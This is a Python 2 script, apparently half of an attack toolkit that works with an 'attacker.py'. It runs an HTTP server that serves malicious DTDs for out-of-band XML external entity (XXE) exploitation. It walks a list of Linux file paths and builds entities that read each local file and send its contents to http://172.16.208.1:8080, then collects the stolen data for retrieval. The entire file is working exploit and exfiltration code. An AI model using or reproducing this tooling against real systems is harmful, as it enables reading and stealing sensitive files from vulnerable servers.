#!/usr/bin/env python
# -*- coding: utf-8 -*-

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

with open("linuxPayloads.txt") as f:
	content = f.readlines()

payloads = [x.strip() for x in content]
directories = []
for pay in payloads:
	if pay.endswith("/"):
		directories.append(pay)

# Establish a basis for our attack string
stub1 = '<!ENTITY % entity SYSTEM "file://'
stub2 = '">\n'
responder = """<!ENTITY % content "<!ENTITY xxeEntity SYSTEM 'http://172.16.208.1:8080/?%entity;'>">"""
counter = 0
results = ""

class S(BaseHTTPRequestHandler):
	# Our server that handles web server requests instantiated by attacker.py
	def _set_headers(self):
		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.end_headers()

	def do_GET(self):
		global counter, results
		self._set_headers()
		if self.path == "/ev.xml":
			if counter < len(payloads):
				print "\n\n\nRequesting: " + payloads[counter]
				results += "\n\nRequesting contents of: " + payloads[counter] + "\n\n"

				# Writes the requested file attack string as our response
				# The requesting web server then includes the content of our entity within a web request
				self.wfile.write(stub1 + payloads[counter] + stub2 + responder)
				counter += 1
		elif self.path == "/getInfo":
			self.wfile.write(len(payloads))
		elif self.path == "/getFinalDetails":
			self.wfile.write(results)
		elif self.path == "/reset":
			results = ""
		else:
			results += self.path

	def do_HEAD(self):
		self._set_headers()

def run(server_class=HTTPServer, handler_class=S, port=8080):
	server_address = ('', port)
	httpd = server_class(server_address, handler_class)
	print 'Starting server on port ' + str(port) + '...'
	httpd.serve_forever()

if __name__ == "__main__":
	run()
  
##
##  
